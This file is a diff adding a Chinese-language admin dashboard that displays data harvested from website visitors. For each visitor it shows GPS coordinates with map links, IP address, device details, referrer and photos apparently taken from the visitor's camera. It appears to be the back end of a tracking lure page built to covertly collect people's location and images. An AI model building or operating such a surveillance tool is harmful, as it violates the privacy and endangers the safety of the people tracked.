@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>数据后台</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { background: #0a0a0f; color: #e0e0e0; font-family: 'Courier New', monospace; min-height: 100vh; }
+  .header { padding: 24px 32px; border-bottom: 1px solid #1e1e2e; display: flex; align-items: center; gap: 16px; }
+  .dot { width: 8px; height: 8px; border-radius: 50%; background: #00ff88; box-shadow: 0 0 8px #00ff88; animation: pulse 2s infinite; }
+  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.4} }
+  h1 { font-size: 16px; letter-spacing: 4px; text-transform: uppercase; color: #888; }
+  .stats { display: flex; gap: 24px; padding: 24px 32px; border-bottom: 1px solid #1e1e2e; }
+  .stat { background: #111118; border: 1px solid #1e1e2e; border-radius: 8px; padding: 16px 24px; }
+  .stat-num { font-size: 28px; font-weight: bold; color: #00ff88; }
+  .stat-label { font-size: 11px; color: #555; margin-top: 4px; letter-spacing: 2px; text-transform: uppercase; }
+  .controls { padding: 16px 32px; display: flex; gap: 12px; align-items: center; }
+  .btn { background: #1e1e2e; border: 1px solid #2e2e4e; color: #aaa; padding: 8px 16px; border-radius: 6px; cursor: pointer; font-size: 12px; letter-spacing: 1px; transition: all 0.2s; }
+  .btn:hover { background: #2e2e4e; color: #fff; border-color: #00ff88; }
+  .btn.danger { border-color: #ff4444; color: #ff4444; }
+  .btn.danger:hover { background: #ff444422; }
+  .records { padding: 0 32px 32px; display: flex; flex-direction: column; gap: 16px; }
+  .record { background: #111118; border: 1px solid #1e1e2e; border-radius: 12px; overflow: hidden; }
+  .record-header { padding: 16px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #1a1a2a; }
+  .record-id { font-size: 11px; color: #555; }
+  .record-time { font-size: 11px; color: #444; }
+  .record-body { padding: 20px; display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+  .info-block h3 { font-size: 10px; letter-spacing: 2px; text-transform: uppercase; color: #555; margin-bottom: 10px; }
+  .info-row { display: flex; justify-content: space-between; padding: 6px 0; border-bottom: 1px solid #1a1a2a; }
+  .info-key { font-size: 11px; color: #666; }
+  .info-val { font-size: 11px; color: #ccc; max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+  .photo-block { grid-column: 1/-1; }
+  .photo-grid { display: flex; gap: 12px; flex-wrap: wrap; margin-top: 10px; }
+  .photo-thumb { width: 120px; height: 90px; object-fit: cover; border-radius: 6px; border: 1px solid #2e2e4e; cursor: pointer; transition: transform 0.2s; }
+  .photo-thumb:hover { transform: scale(1.05); border-color: #00ff88; }
+  .badge { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 10px; letter-spacing: 1px; }
+  .badge-ok { background: #00ff8822; color: #00ff88; border: 1px solid #00ff8844; }
+  .badge-err { background: #ff444422; color: #ff4444; border: 1px solid #ff444444; }
+  .empty { text-align: center; padding: 80px; color: #333; font-size: 13px; letter-spacing: 2px; }
+  .modal { display: none; position: fixed; inset: 0; background: #000000cc; z-index: 100; align-items: center; justify-content: center; }
+  .modal.open { display: flex; }
+  .modal img { max-width: 90vw; max-height: 90vh; border-radius: 8px; }
+  .modal-close { position: fixed; top: 20px; right: 20px; cursor: pointer; font-size: 24px; color: #fff; }
+  .map-link { color: #00aaff; text-decoration: none; font-size: 11px; }
+  .map-link:hover { color: #00ff88; }
+  .refresh-spin { animation: spin 1s linear infinite; }
+  @keyframes spin { from{transform:rotate(0deg)} to{transform:rotate(360deg)} }
+  .tag { display: inline-block; background: #1e1e2e; border-radius: 4px; padding: 1px 6px; font-size: 10px; color: #888; margin: 2px; }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div class="dot"></div>
+  <h1>访客数据后台</h1>
+  <span style="margin-left:auto;font-size:11px;color:#444;" id="lastUpdate">-</span>
+</div>
+
+<div class="stats">
+  <div class="stat">
+    <div class="stat-num" id="totalCount">0</div>
+    <div class="stat-label">总访问</div>
+  </div>
+  <div class="stat">
+    <div class="stat-num" id="gpsCount">0</div>
+    <div class="stat-label">获取定位</div>
+  </div>
+  <div class="stat">
+    <div class="stat-num" id="photoCount">0</div>
+    <div class="stat-label">获取照片</div>
+  </div>
+  <div class="stat">
+    <div class="stat-num" id="todayCount">0</div>
+    <div class="stat-label">今日访问</div>
+  </div>
+</div>
+
+<div class="controls">
+  <button class="btn" onclick="loadData()" id="refreshBtn">⟳ 刷新</button>
+  <button class="btn" onclick="exportJSON()">↓ 导出JSON</button>
+  <button class="btn danger" onclick="clearData()">✕ 清空数据</button>
+  <span style="font-size:11px;color:#444;margin-left:auto;">自动刷新 30s</span>
+</div>
+
+<div class="records" id="recordList">
+  <div class="empty">加载中...</div>
+</div>
+
+<div class="modal" id="photoModal" onclick="closeModal()">
+  <span class="modal-close">✕</span>
+  <img id="modalImg" src="" />
+</div>
+
+<script>
+const API_BASE = ''; // 同域部署，留空即可
+
+let allRecords = [];
+
+async function loadData() {
+  const btn = document.getElementById('refreshBtn');
+  btn.classList.add('refresh-spin');
+  try {
+    const res = await fetch(API_BASE + '/api/records');
+    const data = await res.json();
+    allRecords = data.records || [];
+    renderRecords(allRecords);
+    updateStats(allRecords);
+    document.getElementById('lastUpdate').textContent = '更新于 ' + new Date().toLocaleTimeString();
+  } catch(e) {
+    document.getElementById('recordList').innerHTML = '<div class="empty" style="color:#ff4444">加载失败，请检查API连接</div>';
+  }
+  btn.classList.remove('refresh-spin');
+}
+
+function updateStats(records) {
+  document.getElementById('totalCount').textContent = records.length;
+  document.getElementById('gpsCount').textContent = records.filter(r => r.location).length;
+  document.getElementById('photoCount').textContent = records.filter(r => r.photos && r.photos.length > 0).length;
+  const today = new Date().toDateString();
+  document.getElementById('todayCount').textContent = records.filter(r => new Date(r.time).toDateString() === today).length;
+}
+
+function renderRecords(records) {
+  const list = document.getElementById('recordList');
+  if (!records.length) {
+    list.innerHTML = '<div class="empty">暂无数据，等待访客...</div>';
+    return;
+  }
+  list.innerHTML = records.slice().reverse().map((r, i) => `
+    <div class="record">
+      <div class="record-header">
+        <span class="record-id">#${String(records.length - i).padStart(4,'0')} &nbsp;|&nbsp; ${r.id || '—'}</span>
+        <div style="display:flex;gap:8px;align-items:center">
+          ${r.location ? '<span class="badge badge-ok">✓ 定位</span>' : '<span class="badge badge-err">✗ 定位</span>'}
+          ${r.photos && r.photos.length ? `<span class="badge badge-ok">✓ ${r.photos.length}张照片</span>` : '<span class="badge badge-err">✗ 照片</span>'}
+          <span class="record-time">${new Date(r.time).toLocaleString('zh-CN')}</span>
+        </div>
+      </div>
+      <div class="record-body">
+        <div class="info-block">
+          <h3>📍 位置信息</h3>
+          ${r.location ? `
+            <div class="info-row"><span class="info-key">纬度</span><span class="info-val">${r.location.latitude?.toFixed(6)}</span></div>
+            <div class="info-row"><span class="info-key">经度</span><span class="info-val">${r.location.longitude?.toFixed(6)}</span></div>
+            <div class="info-row"><span class="info-key">精度</span><span class="info-val">${r.location.accuracy ? r.location.accuracy.toFixed(0) + 'm' : '—'}</span></div>
+            <div class="info-row"><span class="info-key">地图</span><span class="info-val"><a class="map-link" href="https://maps.google.com/?q=${r.location.latitude},${r.location.longitude}" target="_blank">Google Maps ↗</a> &nbsp; <a class="map-link" href="https://uri.amap.com/marker?position=${r.location.longitude},${r.location.latitude}" target="_blank">高德 ↗</a></span></div>
+          ` : '<div class="info-row"><span class="info-key" style="color:#444">用户拒绝或不支持</span></div>'}
+        </div>
+        <div class="info-block">
+          <h3>🖥 设备信息</h3>
+          <div class="info-row"><span class="info-key">IP</span><span class="info-val">${r.ip || '—'}</span></div>
+          <div class="info-row"><span class="info-key">系统</span><span class="info-val">${r.device?.os || '—'}</span></div>
+          <div class="info-row"><span class="info-key">浏览器</span><span class="info-val">${r.device?.browser || '—'}</span></div>
+          <div class="info-row"><span class="info-key">语言</span><span class="info-val">${r.device?.lang || '—'}</span></div>
+          <div class="info-row"><span class="info-key">屏幕</span><span class="info-val">${r.device?.screen || '—'}</span></div>
+          <div class="info-row"><span class="info-key">来源</span><span class="info-val" title="${r.referrer || ''}">${r.referrer ? r.referrer.substring(0,40)+'...' : '直接访问'}</span></div>
+        </div>
+        ${r.photos && r.photos.length ? `
+        <div class="info-block photo-block">
+          <h3>📷 拍摄照片</h3>
+          <div class="photo-grid">
+            ${r.photos.map((p, pi) => `<img class="photo-thumb" src="${p}" onclick="openModal(event,'${p}')" alt="photo-${pi}" />`).join('')}
+          </div>
+        </div>` : ''}
+      </div>
+    </div>
+  `).join('');
+}
+
+function openModal(e, src) {
+  e.stopPropagation();
+  document.getElementById('modalImg').src = src;
+  document.getElementById('photoModal').classList.add('open');
+}
+function closeModal() {
+  document.getElementById('photoModal').classList.remove('open');
+}
+
+function exportJSON() {
+  const blob = new Blob([JSON.stringify(allRecords, null, 2)], {type:'application/json'});
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = 'records_' + Date.now() + '.json';
+  a.click();
+}
+
+async function clearData() {
+  if (!confirm('确认清空所有数据？不可恢复！')) return;
+  await fetch(API_BASE + '/api/records', { method: 'DELETE' });
+  loadData();
+}
+
+loadData();
+setInterval(loadData, 30000);
+</script>
+</body>
+</html>
